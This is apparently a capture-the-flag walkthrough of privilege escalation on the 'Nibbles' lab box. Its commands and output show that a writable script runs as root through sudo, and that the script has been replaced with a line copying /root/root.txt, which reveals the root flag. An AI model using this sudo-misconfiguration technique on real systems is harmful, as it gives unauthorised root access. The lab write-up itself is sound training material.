# <center> PrivEsc</center>
# whoami

```sh
nibbler@Nibbles:/$ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

# Home directory

```bash
nibbler@Nibbles:/home/nibbler$ ls -l
total 12
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 personal
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 May 12 18:29 user.txt
```

# Personal Directory

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -l
total 8
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
-rw-r--r-- 1 root    root      33 May 12 18:32 toto
```

# sudo 

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -l 
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

# The exploit is straight forward, the user nibbler can run monitor.sh as root and nibble has read & write access to monitor.sh


```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh 
cat /root/root.txt > todo.txt
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh 
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat todo.txt 
cc67a50ffb061cd971cff2f1a9c5e446
```